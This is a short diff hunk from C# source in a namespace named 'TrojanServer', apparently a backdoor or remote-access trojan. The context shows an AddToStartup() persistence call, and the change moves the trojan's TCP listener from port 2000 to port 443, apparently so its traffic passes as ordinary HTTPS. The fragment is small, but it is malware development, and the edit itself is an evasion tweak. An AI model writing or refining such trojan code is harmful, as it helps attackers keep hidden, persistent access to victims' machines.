@@ -166,7 +166,7 @@ namespace TrojanServer
 
                 AddToStartup();
 
-                TcpListener l = new TcpListener(2000);
+                TcpListener l = new TcpListener(443);
 
                 l.Start();
 
